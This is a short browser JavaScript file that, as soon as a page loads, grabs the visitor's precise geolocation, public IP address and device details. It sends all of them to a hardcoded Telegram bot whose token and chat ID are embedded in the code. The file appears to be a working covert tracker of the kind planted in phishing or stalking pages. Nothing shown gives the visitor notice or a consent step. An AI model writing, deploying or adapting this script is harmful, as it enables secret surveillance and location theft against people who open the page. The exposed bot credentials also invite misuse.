const TELEGRAM_TOKEN = '7204036205:AAHchmdso7LLCfbDjnniaQ4FrpF2ey34E4A';
const CHAT_ID = '6370380481';

async function getIPInfo() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP:', error);
    return 'Unknown IP';
  }
}

async function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    vendor: navigator.vendor,
    language: navigator.language
  };
}

async function sendToTelegram(location, ip, deviceInfo) {
  const message = `
🚨 New Access Detected 🚨
📍 Location: ${location.latitude}, ${location.longitude}
🌐 IP: ${ip}
📱 Device Info:
- User Agent: ${deviceInfo.userAgent}
- Platform: ${deviceInfo.platform}
- Vendor: ${deviceInfo.vendor}
- Language: ${deviceInfo.language}
⏰ Time: ${new Date().toISOString()}
`;

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  const params = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'HTML'
  };

  try {
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(params)
    });
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}

async function main() {
  try {
    // Get location
    const position = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject);
    });
    
    // Get IP and device info
    const ip = await getIPInfo();
    const deviceInfo = await getDeviceInfo();
    
    // Send all info to Telegram
    await sendToTelegram(position.coords, ip, deviceInfo);
    
  } catch (error) {
    console.error('Error:', error);
    // Try to send error info to Telegram
    const deviceInfo = await getDeviceInfo();
    const ip = await getIPInfo();
    await sendToTelegram({latitude: 'Not available', longitude: 'Not available'}, ip, deviceInfo);
  }
}

// Start tracking when page loads
document.addEventListener('DOMContentLoaded', main);